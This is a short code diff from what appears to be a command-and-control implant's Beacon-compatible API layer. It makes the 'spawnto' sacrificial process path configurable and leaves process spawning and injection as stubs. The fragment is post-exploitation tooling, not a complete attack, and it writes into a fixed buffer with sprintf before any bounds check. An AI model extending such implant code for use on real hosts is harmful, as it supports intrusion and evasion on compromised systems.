@@ -325,24 +325,31 @@ BOOL BeaconIsAdmin(void) {
  * These functions are basic place holders, and if implemented into something
  * real should be just calling internal functions for your tools. */
 void BeaconGetSpawnTo(BOOL x86, char* buffer, int length) {
-    char* tempBufferPath = NULL;
+	CHAR tempBufferPath [MAX_PATH * 2];
+
     if (buffer == NULL) {
         return;
     }
     if (x86) {
-        tempBufferPath = "C:\\Windows\\"X86PATH"\\"DEFAULTPROCESSNAME;
+        sprintf(tempBufferPath, "C:\\Windows\\"X86PATH"\\%s", xenonConfig->spawnto);
     }
     else {
-        tempBufferPath = "C:\\Windows\\"X64PATH"\\"DEFAULTPROCESSNAME;
+        sprintf(tempBufferPath, "C:\\Windows\\"X64PATH"\\%s", xenonConfig->spawnto);
     }
 
     if ((int)strlen(tempBufferPath) > length) {
         return;
     }
+
     memcpy(buffer, tempBufferPath, strlen(tempBufferPath));
+
     return;
 }
 
+/* 
+    I'm not gonna support these currently. The BOF should do these things on their own.
+*/
+/* --------------------------------------------------------------------------------------------------------------------------------------------------------- */
 BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo, PROCESS_INFORMATION* pInfo) {
     BOOL bSuccess = FALSE;
     if (x86) {
@@ -363,6 +370,7 @@ void BeaconInjectTemporaryProcess(PROCESS_INFORMATION* pInfo, char* payload, int
     /* Leaving this to be implemented by people needing/wanting it */
     return;
 }
+/* --------------------------------------------------------------------------------------------------------------------------------------------------------- */
 
 void BeaconCleanupProcess(PROCESS_INFORMATION* pInfo) {
     (void)CloseHandle(pInfo->hThread);
